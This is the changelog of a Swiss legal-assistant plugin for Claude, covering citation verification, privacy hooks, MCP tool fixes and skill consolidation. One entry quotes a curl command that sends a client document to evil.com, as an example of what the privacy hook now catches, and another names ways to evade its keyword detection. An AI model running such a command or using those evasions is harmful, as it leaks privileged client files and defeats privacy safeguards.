# Changelog

All notable changes to BetterCallClaude will be documented in this file.

---

## [4.9.4] - 2026-08-02

### Added
- **Substantive citation verification** (BCC-SPEC-CITATION-VERIFY-001) — new skill `citation-content-verify` that checks every citation in a draft against the live source on two axes: existence AND content support (entailment). Per-citation status: `MATCH` / `PARTIAL` / `MISMATCH` / `UNVERIFIED` / `SKIPPED`. Any `UNVERIFIED` or `MISMATCH` citation blocks automatic delivery — the draft must be fixed, explicitly disclaimed, or escalated. Structured per-citation output (`citation_id`, `source_mcp`, `query_used`, `status`, `matched_snippet`, `confidence_score`) is logged to `bcc-output/<date-slug>/citation-verify.json`.
- **Acceptance eval set** — `legal-briefing-workspace/evals/citation-verify-evals.json` with 39 cases: 12 fabricated citations (must be 100% `UNVERIFIED`), 20 genuine citations (false-positive `MISMATCH` rate < 5%), 4 content mismatches, 2 partial matches, 1 structured-doctrine case.

### Changed
- **`legal-evaluator` skill** — new pre-score gate (Evaluation Procedure step 4): runs `citation-content-verify` before computing the verdict score. `UNVERIFIED`/`MISMATCH` citations produce FAIL findings regardless of profile; `PARTIAL` produces WARN; a blocked delivery means the verdict cannot pass.
- **`/legal-loop`** — the verdict step now includes the substantive citation gate.
- **Orchestrator agent** — `citation-content-verify` is a mandatory quality gate before DELIVER for any deliverable containing citations; the litigation pipeline template routes through it explicitly.
- **Citation-specialist agent** — new workflow step 2.5 CONTENT-VERIFY between VALIDATE and CROSS-REFERENCE.
- **`/validate`** — points to `citation-content-verify` for substantive (existence + content) verification of drafts.

### Notes for maintainers
- The stage reuses existing MCP infrastructure only — no new retrieval tooling: `legal-citations` (extract/parse/validate), `swiss-caselaw` (`cite`, `check_claim_support`, `find_relevant_erwaegung`, `attest_response`), `fedlex-sparql`, `entscheidsuche`, `onlinekommentar`.
- Entailment for federal case law uses the server-side LLM judge (`check_claim_support`); statutes, cantonal decisions, and doctrine use the verifying agent's own judgment over retrieved text and are scored with lower confidence. Informal doctrine (author/title/margin number) is `SKIPPED` per spec.
- Privacy: in `strict` mode, claim sentences are never sent to cloud content-checks — existence-only verification with a `(privacy-gated)` note.

---

## [4.9.3] - 2026-07-18

### Fixed
- **Critical: Cowork MCP tool naming** — all 20 agents, 14 skills, and 26 commands now use the correct plugin-scoped tool names (`mcp__plugin_bettercallclaude_<server>__<tool>`) required by Claude Cowork Desktop. The previous `mcp__bettercallclaude-http-<server>__` prefix was rejected by Cowork, leaving agents without access to Swiss legal databases and forcing them to fall back to web search for citation verification.
- **`scripts/generate-tool-frontmatter.js`** — updated to emit the correct `mcp__plugin_bettercallclaude_` prefix.

### Notes for maintainers
- Cowork's GitHub-synced marketplace auto-sync bug (`git fetch` without `git pull`) may still prevent the update from appearing automatically. Users on Pro plans should manually `git pull` in the Cowork cache or remove/re-add the marketplace; see `docs/plugin-update-guide.md`.

---

## [4.9.2] - 2026-07-17

### Fixed
- **MCP tool integration in skills and commands** — all 14 skills and all 26 commands now declare the MCP tools they use in their YAML frontmatter, completing the v4.9.1 integration work that covered the 20 agents.
- **`scripts/generate-tool-frontmatter.js`** — new analysis script that scans skills/commands for MCP tool references and generates fully-qualified frontmatter entries (`mcp__bettercallclaude-http-<server>__<tool>`).

### Notes for maintainers
- Skills/commands that delegate to other skills inherit the invoked skills' MCP tools in their frontmatter (e.g., `research.md` includes the full `swiss-legal-research` tool set).
- The mapping of bare tool names to MCP servers is best-effort static analysis; ambiguous cases were resolved by context heuristics and manual review.

---

## [4.9.1] - 2026-07-17

### Fixed
- **MCP tool integration in agents** — all 20 agents now declare the MCP tools they use in their YAML frontmatter. Previously only `prompt-engineer.md` declared MCP tools; other agents listed only generic Kimi tools and could not invoke the legal databases referenced in their bodies.
- **Wrong/non-existent tool references**:
  - `bettercallclaude/agents/researcher.md`: removed `get_decision_by_citation` (not provided by any MCP) and replaced `verify_citation` with the real `validate_citation` tool.
  - `bettercallclaude/agents/drafter.md`: replaced `verify_citation` with `validate_citation`.
  - `bettercallclaude/commands/setup.md`: corrected diagnostic tool names for `legal-persona` (`legal_analyze`, `legal_draft`, `legal_strategy`, `compute_deadlines`, `present_adversarial_analysis`, `present_intake_form`), `tas-jurisprudence` (`cas_search`, `cas_get_award`, `cas_recent`, `cas_by_sport`), and the full `ollama` tool set.
- **`CONNECTORS.md` accuracy** — updated to describe all 9 MCP servers (7 HTTP + 1 SSE + 1 local STDIO), fixed `entscheidsuche` `get_decision` → `get_decision_details`, and added tool summaries for `legal-persona`, `tas-jurisprudence`, `swiss-caselaw`, and `ollama`.

### Changed
- **Documentation refreshed** — `AGENTS.md` and `docs/AGENT_ARCHITECTURE.md` now list all 9 registered MCP servers and their transports.

### Notes for maintainers
- Agent frontmatter MCP tool names follow the convention `mcp__bettercallclaude-http-<server>__<tool>` for HTTP/SSE servers (matching `prompt-engineer.md`).
- `legal-briefing-workspace/` (evaluation data, not a skill) was moved out of `bettercallclaude/skills/` so the skill-frontmatter CI check passes.


## [4.9.0] - 2026-05-25

### Added — Goal-Loop Iterative Verification

- **`/legal-goal` command**: define a machine-checkable legal success condition. Accepts named profiles (`citations-clean`, `draft-passes-gate`, `adversarial-converge`, `nda-batch-clean`, `reg-watch`) or free-text objectives. Produces a persisted Goal Record with YAML header; never starts work itself.
- **`/legal-loop` command**: run a worker-evaluator iteration cycle against a Goal Record. Separate judge agent verifies each iteration using MCP tools. Implements: privacy pre-check, work step, verdict step, decision (stop on success / max-iterations / no-progress / privacy violation). Persists auditable verdict trail in `bcc-output/loops/`.
- **`legal-evaluator` skill** (verdict engine): shared skill that judges artifacts against Goal Records. Enforces worker-judge separation (refuses to judge if worker == evaluator). Returns structured Verdict (pass/fail, 0-100 score, itemised findings). Uses citation integrity, factual support, and source retrieval MCP tools.
- **5 pre-wired loop profiles**:
  - `citations-clean` — flagship anti-hallucination gate; every citation validated via MCP, R1/R2 enforced
  - `draft-passes-gate` — drafting quality gate (citations + structure + claim support)
  - `adversarial-converge` — iterative stress-test; advocate strengthens, adversary + judge evaluate
  - `nda-batch-clean` — triage completeness gate for NDA folders
  - `reg-watch` — scheduled regulatory monitoring (Fedlex + swiss-caselaw changes, one-pass-per-run)
- **Scheduling documentation** for `reg-watch`: how to launch from cron-style tasks, Claude scheduled sessions, or Devin automations.

### Safety (non-negotiable)
- Max iterations: finite, default 5, hard cap 20
- No-progress guard: stops after 2 consecutive iterations without score improvement
- Separation enforcement: worker and evaluator must be different agents
- Honest termination: NOT MET on stop-without-success, residual findings always listed
- Privacy pre-check every iteration
- R1/R2 anti-hallucination rules enforced in every citation-bearing loop
- Human-in-the-loop: loop never files, sends, signs, or transmits anything

### Implementation choices (Section 11 of spec)
- Score scale: 0-100 uniform across all profiles
- Goal Record header: YAML frontmatter in .md file
- Evaluator: skill invocation (not subagent), with separation guaranteed by role check
- Default max_iterations: 5 for most profiles; 3 for nda-batch-clean; 1 for reg-watch

---

## [4.8.3] - 2026-05-25

### Fixed — MCP Tool References
- **`doctor.md`**: corrected tool probe names — `search_personas` → `legal_analyze`, `search_tas_awards` → `cas_search`, `search_decisions` for swiss-caselaw. Updated `legal-persona` description from "Profili magistrati svizzeri" to "Analisi, strategia e drafting documenti legali svizzeri".
- **`help.md`**: corrected `legal-persona` description from "Swiss judicial personas — profiles, voting patterns, doctrinal positions" to "Swiss-law document intelligence (strategy, drafting, analysis)".
- **`version.md`**: corrected `legal-persona` description.
- **`README.md`**: added missing servers (legal-persona, tas-jurisprudence, swiss-caselaw, ollama) to MCP server table; updated server counts (6 → 9).

### Added — CONNECTORS Documentation
- **`CONNECTORS.md`**: added complete sections for `legal-persona` (tools: `legal_strategy`, `legal_draft`, `legal_analyze`), `tas-jurisprudence` (tools: `cas_search`, `cas_get_award`, `cas_recent`, `cas_by_sport`), and `swiss-caselaw` (SSE, opencaselaw.ch). Updated overview table and server counts from 6 to 9.

### Added — Widget Integration Hooks
- **Adversarial Dashboard (W2)**: `adversarial-analysis` SKILL.md now checks for `present_adversarial_analysis` tool after Judicial synthesis — invokes it with structured advocate/adversary/judge data if available; falls back to full textual output if not.
- **Intake Form (W4)**: `legal-intake` SKILL.md now checks for `present_intake_form` tool in Briefing mode — renders Socratic questions as a form widget (max 1 follow-up round) if available; falls back to chat dialogue if not.
- **`compute_deadlines`**: `swiss-legal-strategy` SKILL.md now references the `compute_deadlines` tool for procedural deadline computation under ZPO/BGG/VwVG/StPO. Includes Fristberechnung rules, Gerichtsferien, and mandatory verification disclaimer. Falls back to manual calculation with disclaimer if tool unavailable.

---

## [4.8.2] - 2026-06-10

### Skills Consolidated (Spec D)

Skill count reduced from 15 to 12 with zero capability loss. All content migrated integrally.

| Removed Skill | Migrated To | Rationale |
|---------------|-------------|-----------|
| `output-summarization` | `/bettercallclaude:summarize` command (full content embedded) | Process step, not domain knowledge — invoked only by orchestration |
| `swiss-jurisdictions` | Routing logic → `swiss-legal-research`; canton profiles → `skills/shared/references/swiss-jurisdictions.md` (on-demand) | Already used as library, not user-activated; 686 lines of reference data freed from permanent context |
| `legal-query-refinement` | `legal-intake` (refine mode) + `legal-intake/references/refinement-workflow.md` | Merged with `legal-briefing` — same job (query → plan), different complexity modes |
| `legal-briefing` | `legal-intake` (briefing mode) | See above |

### Added
- **`legal-intake` skill**: unified intake with two modes — Refine (single-domain, ≤3 Socratic rounds) and Briefing (multi-domain, specialist panel + execution plan). Replaces both `legal-query-refinement` and `legal-briefing`.
- **`docs/audit/SKILLS-AUDIT.md`**: full inventory, token measurements, overlap mapping, consolidation decisions with rationale, before/after metrics.
- **`skills/shared/references/swiss-jurisdictions.md`**: 26 canton profiles (court hierarchies, data sources, special courts) loaded on demand.
- **Citation delegation**: `swiss-legal-translation` now explicitly delegates citation conversion to `swiss-citation-formats` (eliminated duplicated boundary explanation).

### Changed
- **All skill descriptions** trimmed to ~80 words or fewer (previously 98-167 words). Reduced permanent context tax.
- **`swiss-legal-research`**: absorbed jurisdiction resolution from `swiss-jurisdictions` — now includes federal/cantonal routing logic.
- **`swiss-legal-drafting`**: updated references from `swiss-jurisdictions` to `swiss-legal-research` + reference module.
- **`legal-5step-framework`**: Step 1 now references `swiss-legal-research` for jurisdiction resolution.
- **Commands updated**: `legal`, `federal`, `cantonal`, `refine`, `briefing`, `summarize` — all references to removed skills replaced.
- **Agents updated**: all 20 agents' skill reference lists updated to remove `swiss-jurisdictions`.
- **`help` and `version` commands**: skill list updated to 12, version bumped to 4.8.2.
- **README and plugin.json**: version bumped, skill counts updated, What's New section added.

---

## [4.8.1] - 2026-06-10

### Added
- **`/bettercallclaude:start` command**: Cowork-first onboarding — language detection, MCP connectivity check (reuses `doctor` logic), guided playbook creation through natural-language questions, profile-specific usage examples (law firm / in-house / fiduciary). Absorbs all functionality of `/setup`.
- **`/bettercallclaude:doctor` command**: MCP server diagnostics — tests each of the 9 servers with lightweight calls, reports status and user-impact in plain language (no technical jargon), suggests concrete fixes when servers are unavailable.
- **Deliverable-as-file convention** (`bcc-output/`): long outputs (memos, research, strategy, drafts, triage) are now written as files in `bcc-output/YYYY-MM-DD-<slug>/` with numbered phases and `sources.md` for citation trails. Chat shows only a 3–5 line summary. Output folder configurable in playbook. Defined once in `skills/shared/SKILL.md` and referenced by all commands.
- **Reduced mode** declared in 10 MCP-dependent skills: `swiss-legal-drafting`, `swiss-legal-strategy`, `swiss-document-analysis`, `swiss-citation-formats`, `swiss-legal-translation`, `adversarial-analysis`, `compliance-frameworks`, `data-protection-law`, `swiss-jurisdictions`. Each includes an explicit degradation table showing what works and what doesn't when MCP servers are unavailable.
- **Privacy-routing Cowork fallback**: skill-level privacy check added to `privacy-routing` SKILL.md as defense-in-depth when `PreToolUse` hook is absent. Same pattern-matching logic (strong/weak markers, file paths) applied via Claude's instruction-following.
- **Natural language flag equivalents**: `legal`, `legal-5step`, `workflow`, `briefing`, `adversarial` commands now include plain-language alternatives for all flags (e.g. "analisi breve" → `--short`, "salta il briefing" → `--skip-briefing`).
- **Output convention references** added to: `research`, `strategy`, `draft`, `adversarial`, `translate`, `doc-analyze`, `nda-triage`, `precedent`, `workflow`, `legal-5step`, `briefing`, `legal`.
- **Cowork audit matrix** (`docs/audit/COWORK-AUDIT.md`): systematic review of all 24 commands and 15 skills — terminal assumptions, output mode, overlap, Cowork compatibility, and action taken. Serves as regression register for future releases.
- **Quickstart guide** (`docs/QUICKSTART-COWORK.md`): one-page, zero-jargon guide in DE/FR/IT/EN — install, share folder, `/start`, first NDA triage. Includes mini-glossary (command, skill, MCP server, playbook).
- **Hooks verification** documented in `COWORK-AUDIT.md`: `PreToolUse` privacy hook and 5-step workflow enforcement both verified for Cowork compatibility. Skill-level fallback added as defense-in-depth.

### Changed
- **`/bettercallclaude:setup`** → deprecated alias of `/start`. Displays deprecation notice and executes `/start`. Alias remains active through v4.x, removed in v5.0.
- **README**: Cowork-first ordering — "Getting Started (Cowork Desktop)" section before advanced installation. Usage examples include law firm, in-house counsel, and fiduciary profiles. "Renamed Commands" section added.
- **`/bettercallclaude:version`**: updated to v4.8.1, shows `start` and `doctor` commands, references `/doctor` instead of `/setup` for connectivity.
- **`/bettercallclaude:help`**: added `start` and `doctor` to command table, `setup` marked as alias.
- **`/bettercallclaude:privacy`**: removed bash/CLI jargon from implementation notes (no more `cat`, `grep`, `mkdir -p` instructions).
- **Command count**: 22 → 24 (added `start`, `doctor`).

### Command Overlap Resolution (D7 Policy)
- **Policy**: one command per scope; new command absorbs old; old becomes alias with deprecation notice for v4.x; removed only at v5.0.
- **Applied**: `setup` → absorbed by `start`. All `setup` functionality (MCP connectivity check, health endpoint, backend error diagnostics) preserved in `start` + `doctor`.

---

## [4.8.0] - 2026-06-10

### Added
- **Local playbook pattern** (`bettercallclaude.local.md`): firm-specific contractual positions, risk thresholds, escalation rules, citation format, and output language. Four language templates provided (DE/FR/IT/EN) in `templates/`. Playbook search order: `.claude/bettercallclaude.local.md` → shared folder → `.claude/legal.local.md` (Anthropic compat) → Swiss defaults.
- **`/bettercallclaude:nda-triage` command**: Classify NDAs as GREEN (standard approval) / YELLOW (legal review) / RED (substantive issues) against Swiss law criteria and local playbook thresholds. Supports single file and batch (folder) mode. Swiss criteria include Art. 160 ff. OR (Konventionalstrafe), Lugano Convention (forum), zwingendes Recht (mandatory law).
- **Playbook-aware contract review**: `swiss-document-analysis` skill compares contract clauses against playbook standard positions with deviation classification (conforme / scostamento accettabile / scostamento da negoziare / inaccettabile). Redline suggestions reflect playbook positions.
- **Playbook integration in drafting**: `swiss-legal-drafting` skill applies playbook preferences for governing law, jurisdiction, liability caps, and citation format when drafting contracts.
- **Coexistence with Anthropic Legal plugin**: `legal.local.md` compatibility (permanent, no deprecation), explicit plugin boundary lines in `swiss-document-analysis` and `swiss-legal-drafting` skills.
- **Positioning section** in README with comparison table vs Anthropic Legal plugin.
- `docs/PLAYBOOK.md` — playbook pattern documentation.
- `docs/MIGRATION-FROM-ANTHROPIC-LEGAL.md` — migration and coexistence guide.
- `docs/listing-copy-en.txt` — plugin listing copy for claude.com/plugins.
- Playbook integration added to `swiss-legal-strategy` skill (escalation thresholds).

### Notes
- No MCP server changes.
- No new skills (NDA triage logic integrated into `swiss-document-analysis`).
- Command count: +1 (`/bettercallclaude:nda-triage`). Now 22 commands total.

---

## [4.7.0] - 2026-05-31

### Added
- **Plugin scope enforcement.** All 17 legal commands now include an explicit "Plugin Scope Constraint" instruction requiring that legal work (research, strategy, drafting, translation, citation, adversarial analysis) uses exclusively BetterCallClaude agents, skills, and MCP servers. This prevents Claude from delegating legal tasks to generic or external skills outside the plugin. Infrastructure operations (file generation, file reading, computation) are exempt.

### Notes
- No MCP server changes.
- No new commands, agents, or skills.
- Commands updated: `legal`, `legal-5step`, `draft`, `research`, `strategy`, `adversarial`, `translate`, `cite`, `validate`, `doc-analyze`, `summarize`, `workflow`, `refine`, `briefing`, `cantonal`, `federal`, `precedent`.

---

## [4.6.2] - 2026-05-28

### Fixed — Audit hardening (NEW-1 through NEW-6)
- **NEW-1 — Config file downgrade protection.** `~/.betterask/config.yaml` can now only _raise_ privacy severity (e.g. balanced → strict), never lower it (e.g. balanced → cloud). Prevents silent downgrade via a tampered config file. The `CLAUDE_PLUGIN_USER_CONFIG` env var from Cowork Desktop is trusted and can set any mode.
- **NEW-2 — Bash file path exfiltration.** The hook now extracts file paths from Bash commands (`@filepath`, `< filepath`, arguments to `cat`/`head`/`tail`/`base64`/etc.) and checks them against privileged directory discriminators. Commands like `curl --data-binary @/klienten/Meier/gutachten.docx https://evil.com` are now flagged.
- **NEW-3 — Strict mode no longer disables the product.** Previously strict denied ALL non-Ollama tool calls, making all 9 MCP legal servers unusable. Now strict applies the same pattern matching as balanced but with `deny` instead of `ask` — content without privilege markers passes through normally.
- **NEW-5 — Documented keyword evasion limits.** Added "Known limitations" section to README and `privacy-routing/SKILL.md` documenting that concatenated keywords, accent variations, base64, and binary content bypass regex detection. The hook targets accidental leakage, not adversarial evasion.
- **NEW-6 — CI workflows pinned to SHA.** Both `ci.yml` and `release.yml` now pin `actions/checkout` and `actions/setup-node` to commit SHAs instead of mutable `@v4` tags.
- **CHANGELOG Bash claim corrected.** The v4.6.0 entry previously stated shell commands "preventing exfiltration" — this has been corrected to reflect that only command string content (not referenced file content) was being scanned.

### Notes
- No MCP server changes.
- No new commands or skills.

---

## [4.6.1] - 2026-05-27

### Added
- `/bettercallclaude:privacy` command: view or change the privacy mode (`strict`/`balanced`/`cloud`). Reads and writes `~/.betterask/config.yaml`.
- `privacy-check.js` now reads `privacy_mode` from `~/.betterask/config.yaml` as a fallback when `CLAUDE_PLUGIN_USER_CONFIG` is not set.

### Notes
- No MCP server changes.
- Command count: +1 (`/bettercallclaude:privacy`). Now 21 commands total.

---

## [4.6.0] - 2026-05-25

### Added
- `/bettercallclaude:legal-5step` command: sequential 5-step pipeline (intake → research → strategy → adversarial → draft) with `--short/--medium/--long/--no-summary/--stop-after/--lang/--canton` flags and checkpoints at Steps 3 and 4.
- `legal-5step-framework` skill: coordinates the pipeline, enforces citation integrity (all Step 5 citations must trace to Step 2 memo), propagates Anwaltsgeheimnis privilege flag across all steps, and triggers quality gates on low probability or high strategy delta.

### Fixed — Privacy hardening
- **Strong privilege patterns now prompt the user (`ask`) with clear category info.** Attorney-specific terms (Anwaltsgeheimnis, secret professionnel, segreto professionale, Art. 321 StGB, etc.) trigger a confirmation prompt — the user can review and decide whether to proceed. Weak patterns (bare "vertraulich", "confidentiel", etc.) also use `"ask"` with discriminator gating.
- **Bash tool added to hook matcher.** `hooks.json` matcher was `Write|Edit|MultiEdit|WebFetch|mcp__.*` — `Bash` was missing despite the JS code already supporting the `command` field. Shell commands containing privilege markers in the command string are now intercepted.
- **Privacy modes implemented.** The `strict`/`balanced`/`cloud` modes described in the README and `privacy-routing` skill were documentation-only — `privacy-check.js` never read any configuration. Now reads `privacy_mode` from `CLAUDE_PLUGIN_USER_CONFIG` env var (also added to `plugin.json` `userConfig`): `strict` blocks all non-Ollama tool calls (Ollama is local, exempt), `balanced` (default) prompts for strong + weak patterns, `cloud` prompts for strong only.
- **README privacy section rewritten.** Replaced "compliance" claim with "assistive technology / additional layer of protection". Added professional disclaimer matching `privacy-routing/SKILL.md`. Mode descriptions updated to reflect actual behavior.
- **Privacy skill Hook Integration section updated** to document deny/ask distinction, Bash coverage, and mode behavior.
- **Expanded pattern coverage.** Added 14 new strong patterns:
  - DE: `Verschwiegenheitspflicht`, `Geheimhaltungspflicht`, `anwaltliche Verschwiegenheit`
  - FR: `obligation de discrétion`, `secret du mandat`, `confidentialité du mandat`
  - IT: `vincolo professionale`, `obbligo di riservatezza`, `segreto d'ufficio`
  - EN: `attorney-client privilege`, `legal professional privilege`, `solicitor-client privilege`, `privileged and confidential`
  - Legal: `Art. 622 CP`

### Notes
- No MCP server changes.
- Agent and skill count: +1 skill (legal-5step-framework). Command count: +1 (/bettercallclaude:legal-5step).

---

## [4.5.0] - 2026-05-09

### Changed
- **Skill descriptions v2 — richer trigger semantics for Cowork's auto-router.** All 14 skills' `description:` frontmatter rewritten to list concrete trigger conditions, MCP tool names by name, and explicit `Do NOT trigger for:` boundaries with cross-references to other skills. Description sizes grew from short summaries (~300 chars) to 1.5K–2.4K chars each, giving Cowork's skill router much more signal for accurate auto-activation. Example: `swiss-legal-research` description now names 5 MCPs and 14 tools and rules out citation-only / refinement-only / drafting-only / translation-only queries.
- **Skill bodies enriched alongside descriptions** (13 of 14 skill bodies modified, +411 / −146 lines across `bettercallclaude/skills/**/SKILL.md`). New body sections include: FINIG transitional period guidance and Crypto/DLT regulation reference + MCP-tools section in `compliance-frameworks` (+58 lines, 12 KB → 18 KB); explicit MCP-tool listings in `swiss-legal-research` Step 2 (+98/−41 lines); GDPR adequacy + MCP-tools section in `data-protection-law` (+36 lines); pipeline-role table and expanded competence matrix in `swiss-jurisdictions` (+48 lines); activation-and-fallback section in `adversarial-analysis` (+24 lines); rewritten Step 2 and conciliation row in `swiss-legal-strategy` (+46 lines); expanded handoff block + pipeline table in `legal-query-refinement` (+46 lines). High-level workflow shapes and agent invocations are preserved — changes are additive references and clarifications, not behavioural rewrites.
- **`legal-briefing` agent reorganised.** Same workflow + agent panel structure, more concise phrasing (net −5 lines, +123/−128 across the file).
- **`/legal` and `/briefing` intent-classification.** Routing fixes between the briefing and jurisdiction skills.

### Fixed
- **DLT-Gesetz SR attribution (`compliance-frameworks` skill).** Three places incorrectly attributed SR 950.1 to the DLT Act. SR 950.1 is FIDLEG; the DLT Act is a Mantelerlass (AS 2021 33) with no own SR number — its provisions are folded into OR (SR 220), FinfraG (SR 958.1), BankG (SR 952.0), and GwG (SR 955.0). Fix prevents `fedlex-sparql.get_article("950.1", ...)` lookups from returning FIDLEG articles when the agent intended DLT provisions.
  - Description (line 3): drop "SR 950.1", describe DLT-Gesetz as Mantelerlass amending OR/FinfraG/BankG/GwG.
  - DLT body section (line 160): drop "(SR 950.1 amends multiple acts)", state DLT Act has no own SR number (AS 2021 33), point to the four amended acts.
  - SR-numbers reference (line 253): drop the false claim that 950.1 is also DLT-Gesetz; add explicit lookup hint pointing to OR Art. 973d–973i and FinfraG Art. 73a–73u.
- **`/legal` complexity threshold metadata.** Description claimed briefing activates at complexity ≥ 5. Body actually splits at three tiers: 1–3 no briefing, 4–6 inline questions handled by `/legal` itself (NOT the skill), 7–10 invokes the legal-briefing skill (`commands/legal.md:137`). Description rewritten: "runs inline briefing for complexity 4–6, activates full briefing session when complexity ≥ 7 (via legal-briefing skill)".
- **`legal-query-refinement` handoff metadata.** Description's `Do NOT trigger for` clause said "queries that score ≥ 5 on the complexity scale". Body's handoff at line 51 only redirects when `complexity ≥ 8 OR 3+ distinct legal domains OR multi-jurisdictional` — gap at complexity 5–7 where the description told the router to skip but the body had no handoff. Description aligned with body's actual handoff condition (option a: keep single-domain clarification broad, matching the skill's own boundary clause).
- **`/version` command** hardcoded version display corrected from stale `4.3.0` (was wrong on 4.4.0 already) to `4.5.0`.
- **`/help` command** version footer corrected from stale `v4.3.0` to `v4.5.0`.

### Removed
- **Dev artifacts that shipped in 4.4.0.** The plugin no longer ships `bettercallclaude/skills/legal-briefing-workspace/` (~150 KB / 55-file eval harness with `iteration-1/`, `evals/`, `old_skill/` vs `with_skill/` benchmark JSON runs, response.md, eval_metadata.json, timing.json, grading.json). Cowork's skill scanner uses `skills/*/SKILL.md` (single wildcard) so the nested `iteration-1/skill-snapshot/SKILL.md` was never picked up — but the directory was being shipped to every user with no purpose.
- Two ad-hoc HTML review exports at the repo root (`legal-briefing-review-iteration-1.html`, `legal-briefing-trigger-eval-review.html`, ~110 KB combined).

### Added
- `.gitignore` rules to prevent the dev-artifact recurrence:
  ```
  legal-briefing-review-*.html
  legal-briefing-trigger-eval-review.html
  bettercallclaude/skills/*-workspace/
  ```

### Notes
- **No MCP server changes.** `.mcp.json` is identical to 4.4.0: 7 HTTP servers on `mcp.bettercallclaude.ch` + `swiss-caselaw` SSE on `mcp.opencaselaw.ch` + `ollama` local STDIO.
- **No skill or agent count changes.** 20 agents, 19 commands, 14 skills — same as 4.4.0. Skill body content was modified (see Changed section above) but no skill was added or removed and no agent logic was rewritten.
- **No userConfig schema changes.** Existing installs upgrade in-place without re-prompting for `ollama_host`, `default_jurisdiction`, `output_language`, or `api_token`.
- **Cowork upgrade path:** `marketplace.json` advertises `4.5.0` once this lands on `main`. Existing users will see "Update plugin" on their next marketplace Sync (manual or auto).

### Content counts

---

## [4.4.0] - 2026-04-21

### Changed
- **Repository split — MCP source code moved out.** All Swiss legal MCP servers (`bge-search`, `entscheidsuche`, `fedlex-sparql`, `legal-citations`, `onlinekommentar`, `legal-persona`, `tas-jurisprudence`) and the HTTP aggregator are now maintained in the separate [`fedec65/BetterCallClaudeMCP`](https://github.com/fedec65/BetterCallClaudeMCP) repo. This repo is now plugin-only: agents, commands, skills, hooks, and `.mcp.json` pointing at remote HTTPS endpoints on `mcp.bettercallclaude.ch`. End-user behaviour is unchanged for the 5 servers already remote since v4.3.0 (commit 4c5b869 hardcoded the URLs); `legal-persona` and `tas-jurisprudence` are net-new MCP surfaces in this release.
- Canonical HTTP aggregator on Railway now serves **7** MCPs (added `legal-persona` and `tas-jurisprudence` alongside the original five).

### Removed
- `mcp-servers-src/` (TypeScript source for the 5 Swiss legal MCPs that existed here, plus `ollama` and test fixtures) — legal MCP sources moved to `BetterCallClaudeMCP/mcp-servers/`; `ollama` source restored under `bettercallclaude/mcp-servers/ollama/` (still plugin-local).
- `mcp-servers-http/` (Express HTTP aggregator) — moved to `BetterCallClaudeMCP/mcp-servers-http/`.
- `scripts/build-servers.sh` (esbuild bundler) — moved with the source.
- `package.json` scripts `build`, `build:bundle`, `test` (they targeted the removed directories). `package` remains.
- CI jobs `test-mcp-servers` and `test-http-server` — those tests now run in the `BetterCallClaudeMCP` repo against the canonical source.

### Notes for maintainers
- To edit an MCP server's behaviour, open a PR in `BetterCallClaudeMCP`, merge to `main`, Railway auto-redeploys.
- This plugin repo only needs changes when editing agents, commands, skills, hooks, the local `ollama` STDIO server, or `.mcp.json` (to add/remove remote endpoints).

### Content counts
- 20 agents, 19 commands, 14 skills, 9 MCP servers in `.mcp.json` (7 remote HTTP + `swiss-caselaw` SSE + `ollama` local STDIO). Remote MCPs available at `mcp.bettercallclaude.ch`: bge-search, entscheidsuche, fedlex-sparql, legal-citations, onlinekommentar, legal-persona, tas-jurisprudence.

---

## [4.3.0] - 2026-04-20

### Fixed
- **Cowork plugin upload validation** — the v4.2.x zip was rejected by Cowork's server-side plugin validator with a generic "PLUGIN VALIDATION FAILED" toast. Binary-bisected against 11 micro-zips and fixed three distinct manifest issues:
  - `userConfig` entries in `plugin.json` now declare `type`, `title`, and `default` as required by Anthropic's Zod schema (PR #15, #21).
  - All 14 `skills/*/SKILL.md` now include the required `name:` frontmatter field (PR #21). The local `claude plugin validate` CLI does not crawl skill frontmatter, so this only surfaces on upload.
  - All 6 gateway URLs in `.mcp.json` are now hardcoded. Cowork rejects `${user_config.*}` inside `url:` fields because upload validation runs before the user is prompted for config values (see [anthropic/claude-code#39455](https://github.com/anthropics/claude-code/issues/39455)). `${user_config.*}` continues to work in `env:`, `args:`, and `headers:` blocks — `ollama_host` is still templated.
- **Privacy hook** now covers `MCP`, `MultiEdit`, and `WebFetch` tool calls (previously only `Bash`, `Edit`, `Write`). Weak markers (bare "confidential"/"vertraulich") now require a corroborating strong signal before triggering, reducing false positives on unrelated text (PR #12).
- **MCP shared code** — resolved duplicate `CacheRepository` class shipped under two files; raw-SQL variant renamed `SqliteCacheRepository` to match its filename (PR #14).
- **CI** — lint step no longer `continue-on-error`; added dedicated HTTP server build job; aligned `engines.node` and TypeScript versions across all packages (PR #16).

### Changed
- **Agent model tiers pinned explicitly** — every agent now declares `model: haiku|sonnet|opus` in its frontmatter. Previously agents defaulted silently. Haiku for fast scoped tasks (citation formatting, summarization); Sonnet for the bulk of domain reasoning; Opus reserved for judicial synthesis and workflow orchestration (PR #13).
- **Orchestrator and briefing agents** gained the `Task` tool so they can actually spawn subagents — previously they could describe workflows but not execute them (PR #13).
- **`userConfig` surface reduced** from 6 keys to 4: dropped `mcp_base_url` and `caselaw_base_url` (now hardcoded). Remaining: `ollama_host`, `default_jurisdiction`, `output_language`, `api_token`. Self-hosters who need a different gateway fork the repo and edit `.mcp.json` directly.

### Added
- `docs/PRIVACY.md` — Anwaltsgeheimnis routing architecture, data flow diagrams, and the updated self-hosting trade-off note (PR #17).
- `SECURITY.md` — responsible disclosure policy and supported-version matrix (PR #17).
- `CONTRIBUTING.md` — contributor workflow including the firm rule that `${user_config.*}` must not appear in `url:` fields of `.mcp.json` (PR #17).
- `data/README.md` — documents which files under `data/` are canonical vs. generated (PR #18).

### Removed
- Dead `install-claude-desktop.sh` (legacy CLI-era script) (PR #18).

### Content counts (unchanged from 4.2.0)
- 20 agents, 19 commands, 14 skills, 7 MCP servers (6 remote + 1 local STDIO `ollama`).

---

## [4.2.0] - 2026-04-16

### Changed
- Split Claude Code CLI into separate repository (fedec65/bettercallclaude-cli)
- This repository is now Cowork Desktop only
- Removed local stdio transport options -- HTTP transport only
- Shortened MCP server key names (dropped `bettercallclaude-` prefix)
- Added full `plugin.json` manifest at plugin root (Anthropic official format)
- Renamed `.mcp.json` to `mcp.json` (Anthropic official format)

---

## [4.1.3] - 2026-04-06

### Changed
- **Architecture refactoring**: Migrated domain methodology from 13 commands into 14 skills
- Commands now serve as thin entry points (5-13 lines) that delegate to skills
- Established single source of truth: skills contain methodology, commands provide slash-command interfaces

### Added
- **4 new skills**: `swiss-legal-translation`, `swiss-document-analysis`, `output-summarization`, `legal-query-refinement`
- Skills now total 14 (up from 10)

### Unchanged
